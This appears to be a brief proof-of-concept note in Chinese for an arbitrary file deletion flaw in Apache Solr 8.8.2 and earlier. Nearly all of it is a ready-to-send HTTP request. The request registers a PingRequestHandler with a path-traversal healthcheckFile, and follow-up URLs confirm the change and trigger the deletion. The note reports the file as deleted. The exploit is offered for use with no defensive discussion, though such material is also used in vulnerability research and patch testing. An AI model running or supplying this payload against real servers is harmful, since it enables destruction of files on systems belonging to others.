影響版本
--------

    Apache Solr < = 8.8.2

POC
---

    POST /solr/db/config HTTP/1.1
    Host: 192.168.33.130:8983
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-type:application/json
    Connection: close
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0
    Content-Length: 218
    {
      "add-requesthandler": {
        "name": "/testping",
        "class":"solr.PingRequestHandler",
        "defaults":{"echoParams":"explicit"},
        "healthcheckFile":"../../../../../../../../../../../../../aaa.txt",
      }
    }

檢查是否成功：

    http://target/solr/db/config/overlay?omitHeader=true

訪問

    http://target/solr/db/testping?action=DISABLE

文件已成功刪除